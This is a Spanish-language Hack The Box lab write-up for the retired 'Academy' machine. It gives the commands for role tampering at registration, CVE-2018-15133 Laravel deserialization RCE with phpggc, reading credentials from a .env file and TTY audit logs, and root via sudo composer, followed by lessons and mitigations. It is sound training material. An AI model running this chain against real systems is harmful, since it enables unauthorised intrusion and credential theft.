---
machine: Academy
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, laravel, deserialization, cve-2018-15133, vhost, sudo]
---

# Academy — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

El registro del sitio permite enviar un `roleid` oculto: cambiarlo da acceso al panel de administración, que revela el vhost `dev-staging-01.academy.htb`. Ese entorno corre Laravel con `APP_DEBUG=true` y filtra el `APP_KEY`; con él, la deserialización de **CVE-2018-15133** da RCE. Un `.env` de otra aplicación filtra una contraseña que sirve para el usuario `cry0l1t3` (grupo `adm`); los logs de auditoría de TTY (`aureport --tty`) revelan la contraseña de `mrb3n`, que es la cuenta con `sudo` sobre `composer`.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp    open  ssh      OpenSSH 8.2p1
80/tcp    open  http     Apache httpd 2.4.41
33060/tcp open  mysqlx   MySQL X protocol
```

```bash
echo "<IP> academy.htb" >> /etc/hosts
gobuster dir -u http://academy.htb -w /usr/share/wordlists/dirb/common.txt -x php
```

El sitio imita la plataforma de HTB Academy: registro, login y una zona de administración en `admin.php`.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. **Registro con rol manipulado**: se intercepta el `POST /register.php` y se añade o cambia el campo oculto `roleid=1`. La cuenta pasa a administrador y `admin.php` muestra un panel con un subdominio de desarrollo.

2. **Vhost con Laravel en modo debug**:

```bash
echo "<IP> dev-staging-01.academy.htb" >> /etc/hosts
curl -s http://dev-staging-01.academy.htb/ | grep -i -E 'APP_KEY|DB_'
```

La traza de error expone las variables de entorno: `APP_KEY`, `DB_USERNAME`, `DB_PASSWORD`.

3. **CVE-2018-15133** (deserialización de cookies en Laravel con `APP_KEY` conocida):

```bash
php -d 'phar.readonly=0' ./phpggc -o /tmp/payload Laravel/RCE9 system 'id' --fast-destruct
python3 laravel_exploit.py http://dev-staging-01.academy.htb/ <APP_KEY> --interactive
```

```text
www-data@academy:/var/www/html/htb-academy-dev-01/public$
```

4. **De web a usuario**: en `/var/www/html/htb-academy-dev-01/.env` hay credenciales de base de datos; la contraseña es reutilizada por `cry0l1t3` (miembro de `adm`):

```bash
cat /var/www/html/htb-academy-dev-01/.env
ssh cry0l1t3@<IP>
```

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

Como `cry0l1t3` pertenece a `adm`, `aureport --tty` muestra las pulsaciones de la sesión de `mrb3n` y de ahí sale su contraseña:

```bash
sudo aureport --tty | less
su mrb3n
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/composer
```

`composer` ejecuta scripts de paquetes; con un `composer.json` propio se lanza un comando como root:

```bash
mkdir -p /tmp/p && cd /tmp/p
cat > composer.json <<'EOF'
{"scripts":{"x":"id"},"config":{"preferred-install":"dist"}}
EOF
sudo composer run-script x
```

```text
uid=0(root) gid=0(root)
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- El campo `roleid` puede llamarse distinto (`role`, `is_admin`); se compara el registro normal con el de administrador.
- El vhost no se resuelve sin añadirlo a `/etc/hosts`.
- `phpggc` necesita `phar.readonly=0`; si no, el payload sale vacío.
- La contraseña del `.env` no es la de `cry0l1t3` en todos los despliegues: probar también la de MySQL (`homestead`).

- Un parámetro de rol aceptado desde el cliente es escalada de privilegios directa.
- `APP_DEBUG=true` en producción filtra claves que habilitan RCE por deserialización.
- `composer` con `sudo` equivale a root: cualquier herramienta que ejecute scripts lo es.
- Mitigación: rol asignado en servidor, debug desactivado fuera de desarrollo y `sudo` restringido a comandos concretos sin scripts.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.

## Referencias

- [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)
